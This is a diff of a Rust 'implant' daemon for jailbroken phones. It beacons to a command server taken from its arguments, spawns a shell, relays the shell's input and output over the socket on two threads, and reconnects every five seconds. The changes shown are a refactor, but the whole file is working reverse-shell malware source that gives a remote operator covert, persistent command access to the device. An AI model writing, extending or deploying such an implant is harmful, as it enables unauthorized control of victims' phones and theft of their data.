@@ -2,11 +2,11 @@
 implant runs on the jailbroken phone as a daemon binary.
 connect -> beacon -> pump shell both ways on two threads.
 */
-
 use ravenna::frame;
 use ravenna::proto::{Beacon, Envelope, ShellData, ShellExit, ShellStart, envelope};
 use ravenna::shell;
 use ravenna::socket::{Sock, SockRole};
+use std::ffi::CStr;
 use std::sync::Arc;
 
 fn _implant_id() -> String {
@@ -17,13 +17,14 @@ fn _implant_id() -> String {
             _buf.len() as libc::size_t,
         );
     }
-    let _s = String::from_utf8_lossy(&_buf);
-    let _t = _s.trim_matches(char::from(0)).trim().to_string();
-    if _t.is_empty() {
-        "implant0".to_string()
-    } else {
-        _t
-    }
+    let _s = CStr::from_bytes_until_nul(&_buf)
+        .map(|_c| _c.to_string_lossy().trim().to_owned())
+        .unwrap_or_default();
+    if _s.is_empty() { "implant0".into() } else { _s }
+}
+
+fn _env(_m: envelope::M) -> Envelope {
+    Envelope { m: Some(_m) }
 }
 
 fn _pump(_sock: Sock) {
@@ -32,17 +33,13 @@ fn _pump(_sock: Sock) {
 
     frame::send_msg(
         &_sock,
-        &Envelope {
-            m: Some(envelope::M::B(Beacon {
-                implant_id: _id.clone(),
-            })),
-        },
+        &_env(envelope::M::B(Beacon {
+            implant_id: _id.clone(),
+        })),
     );
     frame::send_msg(
         &_sock,
-        &Envelope {
-            m: Some(envelope::M::S(ShellStart { implant_id: _id })),
-        },
+        &_env(envelope::M::S(ShellStart { implant_id: _id })),
     );
 
     let _sh = shell::spawn_shell();
@@ -52,29 +49,21 @@ fn _pump(_sock: Sock) {
     let _out_fd = _sh.stdout_fd;
     let _pid = _sh.pid;
     let _t1 = std::thread::spawn(move || {
+        let mut _out = [0u8; 4096];
         loop {
-            let mut _out = [0u8; 4096];
             let _n = shell::shell_read(_out_fd, &mut _out);
             if _n <= 0 {
                 let mut _st = 0 as libc::c_int;
-                let _r = unsafe { libc::waitpid(_pid, &mut _st, libc::WNOHANG) };
-                if _r == _pid {
-                    frame::send_msg(
-                        &_s1,
-                        &Envelope {
-                            m: Some(envelope::M::E(ShellExit { code: _st })),
-                        },
-                    );
+                if unsafe { libc::waitpid(_pid, &mut _st, libc::WNOHANG) } == _pid {
+                    frame::send_msg(&_s1, &_env(envelope::M::E(ShellExit { code: _st })));
                 }
                 break;
             }
             frame::send_msg(
                 &_s1,
-                &Envelope {
-                    m: Some(envelope::M::D(ShellData {
-                        chunk: _out[.._n as usize].to_vec(),
-                    })),
-                },
+                &_env(envelope::M::D(ShellData {
+                    chunk: _out[.._n as usize].to_vec(),
+                })),
             );
         }
     });
@@ -83,14 +72,9 @@ fn _pump(_sock: Sock) {
     let _s2 = _sock.clone();
     let _in_fd = _sh.stdin_fd;
     let _t2 = std::thread::spawn(move || {
-        loop {
-            match frame::recv_msg(&_s2) {
-                Some(_env) => {
-                    if let Some(envelope::M::D(_d)) = _env.m {
-                        shell::shell_write(_in_fd, &_d.chunk);
-                    }
-                }
-                None => break,
+        while let Some(_env) = frame::recv_msg(&_s2) {
+            if let Some(envelope::M::D(_d)) = _env.m {
+                shell::shell_write(_in_fd, &_d.chunk);
             }
         }
     });
@@ -107,19 +91,16 @@ fn _pump(_sock: Sock) {
 
 fn main() {
     let _args: Vec<String> = std::env::args().collect();
-    let _host = _args.get(1).cloned().unwrap_or("127.0.0.1".to_string());
+    let _host = _args.get(1).cloned().unwrap_or_else(|| "127.0.0.1".into());
     let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);
 
     loop {
         eprintln!("implant trying {_host}:{_port} ...");
-        let _s: Sock = Sock::new(SockRole::Client {
+        _pump(Sock::new(SockRole::Client {
             host: _host.clone(),
             port: _port,
-        });
-        _pump(_s);
+        }));
         eprintln!("lost server, sleeping 5s ...");
-        unsafe {
-            libc::sleep(5);
-        }
+        std::thread::sleep(std::time::Duration::from_secs(5));
     }
 }
